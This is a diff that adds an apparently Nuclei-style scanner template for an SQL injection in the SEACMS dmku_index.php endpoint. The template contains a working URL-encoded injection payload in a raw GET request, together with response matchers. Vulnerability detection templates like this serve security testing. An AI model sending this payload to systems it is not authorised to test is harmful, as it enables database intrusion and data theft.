@@ -1,0 +1,32 @@
+id: seacms-dmku-index-sqli
+
+info:
+  name: SEACMS dmku_index SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    SEACMS dmku_index.php file is vulnerable to SQL Injection. Attackers could exploit this vulnerability to steal sensitive data or execute arbitrary commands on the database.
+  reference:
+    - https://mp.weixin.qq.com/s/UFbgsg8LcWs1EAuZ2uPu0A
+  metadata:
+    product: SEACMS
+
+http:
+  - raw:
+      - |
+        GET /js/player/dmplayer/dmku/index.php?ac=so&key=ssssss%25'%20or%201%3Dif(length(database())%3E%3D1,(select%201%20union%20select%2099),1)%20--%20- HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0
+
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "code"
+          - "data"
+          - "count"
+        part: body
